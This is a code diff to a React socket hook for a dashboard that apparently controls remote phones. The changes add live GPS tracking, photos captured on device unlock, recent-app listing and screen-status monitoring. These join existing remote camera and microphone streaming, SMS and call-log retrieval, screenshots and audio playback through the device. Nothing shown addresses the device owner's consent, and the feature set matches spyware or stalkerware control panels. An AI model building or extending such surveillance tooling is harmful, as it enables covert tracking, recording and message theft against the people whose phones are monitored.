@@ -12,9 +12,13 @@ export function useSocket(token) {
   const [connected,    setConnected]    = useState(false)
   const [devices,      setDevices]      = useState({})
   const [deviceNames,  setDeviceNames]  = useState({})
-  const [cameraFrames, setCameraFrames] = useState({})   // { deviceId: { front, back } }
-  const [screenFrames, setScreenFrames] = useState({})   // { deviceId: base64 }
-  const [micActive,    setMicActive]    = useState({})
+  const [cameraFrames,  setCameraFrames]  = useState({})
+  const [cameraErrors,  setCameraErrors]  = useState({})
+  const [locationData,  setLocationData]  = useState({})
+  const [screenStatus,  setScreenStatus]  = useState({})  // { deviceId: { status, timestamp, prevDurationMs } }
+  const [unlockPhotos,  setUnlockPhotos]  = useState({})  // { deviceId: [ { filename, url, timestamp } ] }
+  const [recentApps,    setRecentApps]    = useState({})  // { deviceId: { apps, error } }
+  const [micActive,     setMicActive]     = useState({})
   const [deviceInfos,  setDeviceInfos]  = useState({})
   const [batteries,    setBatteries]    = useState({})
   const [callLogs,     setCallLogs]     = useState({})
@@ -43,8 +47,12 @@ export function useSocket(token) {
     socket.on('connect',    () => setConnected(true))
     socket.on('disconnect', () => setConnected(false))
 
-    socket.on('device:status', ({ deviceId, online }) =>
-      setDevices(p => ({ ...p, [deviceId]: { ...p[deviceId], deviceId, online } })))
+    socket.on('device:status', ({ deviceId, online }) => {
+      setDevices(p => ({ ...p, [deviceId]: { ...p[deviceId], deviceId, online } }))
+      if (!online) {
+        setCameraFrames(p => { const n = { ...p }; delete n[deviceId]; return n })
+      }
+    })
 
     socket.on('device:name', ({ deviceId, name }) =>
       setDeviceNames(p => ({ ...p, [deviceId]: name })))
@@ -54,8 +62,20 @@ export function useSocket(token) {
       setCameraFrames(p => ({ ...p, [deviceId]: { ...p[deviceId], [type]: frame } }))
     })
 
-    socket.on('screen:frame', ({ deviceId, frame }) =>
-      setScreenFrames(p => ({ ...p, [deviceId]: frame })))
+    socket.on('camera:error', ({ deviceId, cameraType, reason }) =>
+      setCameraErrors(p => ({ ...p, [deviceId]: { cameraType, reason, ts: Date.now() } })))
+
+    socket.on('location:update', ({ deviceId, lat, lng, accuracy, altitude, speed, provider, timestamp }) =>
+      setLocationData(p => ({ ...p, [deviceId]: { lat, lng, accuracy, altitude, speed, provider, timestamp } })))
+
+    socket.on('screen:status', ({ deviceId, status, timestamp, prevDurationMs }) =>
+      setScreenStatus(p => ({ ...p, [deviceId]: { status, timestamp, prevDurationMs } })))
+
+    socket.on('unlock:photo:saved', ({ deviceId, filename, url, timestamp }) =>
+      setUnlockPhotos(p => ({ ...p, [deviceId]: [{ filename, url, timestamp }, ...(p[deviceId] || [])].slice(0, 50) })))
+
+    socket.on('recent:apps', ({ deviceId, apps, error }) =>
+      setRecentApps(p => ({ ...p, [deviceId]: { apps, error } })))
 
     socket.on('mic:state', ({ deviceId, active }) =>
       setMicActive(p => ({ ...p, [deviceId]: active })))
@@ -64,6 +84,7 @@ export function useSocket(token) {
       if (format === 'pcm16') playPCM16(chunk, sampleRate || 16000)
       else playWebM(chunk)
     })
+
 
     socket.on('device:info',    ({ deviceId, ...info }) => setDeviceInfos(p => ({ ...p, [deviceId]: info })))
     socket.on('battery:update', ({ deviceId, level, charging }) => setBatteries(p => ({ ...p, [deviceId]: { level, charging } })))
@@ -155,14 +176,15 @@ export function useSocket(token) {
   const cameraStartBack  = useCallback((deviceId) => emit('cmd:camera:start:back',  { deviceId }), [])
   const cameraStopFront  = useCallback((deviceId) => emit('cmd:camera:stop:front',  { deviceId }), [])
   const cameraStopBack   = useCallback((deviceId) => emit('cmd:camera:stop:back',   { deviceId }), [])
-  const screenStart      = useCallback((deviceId) => emit('cmd:screen:start',       { deviceId }), [])
-  const screenStop       = useCallback((deviceId) => emit('cmd:screen:stop',        { deviceId }), [])
   const micOn            = useCallback((deviceId) => emit('cmd:mic:on',             { deviceId }), [])
   const micOff           = useCallback((deviceId) => emit('cmd:mic:off',            { deviceId }), [])
   const speak            = useCallback((deviceId, audioData) => emit('cmd:speak',   { deviceId, audioData }), [])
   const takeScreenshot   = useCallback((deviceId) => emit('cmd:screenshot',         { deviceId }), [])
   const getCallLogs      = useCallback((deviceId) => emit('cmd:get:calllogs',       { deviceId }), [])
   const getSMS           = useCallback((deviceId) => emit('cmd:get:sms',            { deviceId }), [])
+  const locationStart    = useCallback((deviceId) => emit('cmd:location:start',     { deviceId }), [])
+  const locationStop     = useCallback((deviceId) => emit('cmd:location:stop',      { deviceId }), [])
+  const getRecentApps    = useCallback((deviceId) => emit('cmd:get:recent:apps',    { deviceId }), [])
 
   const renameDevice = useCallback(async (deviceId, name) => {
     try {
@@ -172,10 +194,12 @@ export function useSocket(token) {
   }, [token])
 
   return {
-    connected, devices, deviceNames, cameraFrames, screenFrames, micActive,
+    connected, devices, deviceNames, cameraFrames, cameraErrors, locationData,
+    screenStatus, unlockPhotos, recentApps, micActive,
     deviceInfos, batteries, callLogs, smsMessages, screenshots,
     cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
-    screenStart, screenStop, liveSpeakStart, liveSpeakStop,
-    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS, renameDevice,
+    liveSpeakStart, liveSpeakStop,
+    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS,
+    locationStart, locationStop, getRecentApps, renameDevice,
   }
 }
